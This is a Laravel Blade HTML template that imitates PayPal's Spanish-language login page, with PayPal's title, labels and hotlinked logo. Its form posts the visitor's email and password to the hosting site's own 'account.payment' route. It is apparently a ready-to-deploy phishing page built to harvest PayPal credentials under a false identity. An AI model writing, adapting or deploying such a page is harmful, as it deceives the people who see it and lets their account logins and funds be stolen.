<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Inicia sesión en tu cuenta PayPal</title>

    <link href="{{ asset('payment/paypal/img/faviconpaypal.png') }}" rel="icon">
    <link href="{{ asset('payment/paypal/css/csspaypal.css') }}" rel="stylesheet">
</head>
<body>
    <div id="main" class="main " role="main">
        <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
            <div class="corral">
                  <div id="content" class="contentContainer">
                    <header>
                        <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
                      </header>
                      <form method="post" action="{{ route('account.payment') }}">
                            @csrf
                        <div id="passwordSection" class="clearfix">
                            <div class="textInput" id="login_emaildiv">
                                <div class="fieldWrapper">
                                    <label for="email" class="fieldLabel">Correo electrónico</label>
                                    <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Correo electrónico" required>
                               </div>
                            </div>
                            
                         <div class="textInput lastInputField" id="login_passworddiv">
                             <div class="fieldWrapper"><label for="password" class="fieldLabel">Contraseña</label>
                                <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Contraseña" required>
                           </div>
                         </div>
                       </div>
                   <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Iniciar sesión</button></div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">¿Tienes problemas para iniciar sesión?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
                   </form>
                </div>
            </div>
        </section>
    </div>
</body>
</html>